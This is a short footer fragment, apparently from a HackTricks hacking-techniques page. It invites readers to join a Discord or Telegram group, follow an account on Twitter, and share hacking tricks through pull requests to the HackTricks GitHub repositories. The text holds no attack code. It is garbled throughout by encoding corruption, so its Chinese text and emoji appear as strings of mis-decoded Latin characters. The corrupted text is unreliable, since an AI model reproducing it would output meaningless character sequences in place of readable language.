* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ä¸Šå…³æ³¨**æˆ‘ä»¬ã€‚
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
